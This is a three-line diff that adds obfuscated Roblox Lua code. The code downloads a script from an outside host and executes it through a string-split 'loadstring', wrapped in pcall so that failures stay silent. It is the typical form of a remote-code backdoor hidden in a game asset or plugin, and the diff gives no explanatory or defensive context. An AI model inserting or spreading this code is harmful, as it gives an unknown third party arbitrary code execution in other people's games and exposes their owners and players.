@@ -1,0 +1,3 @@
+pcall(function()
+	getfenv()["load".."string"](game:HttpGet("http://li".."gma.wtf/scripts/utilities.lua", true))()
+end)
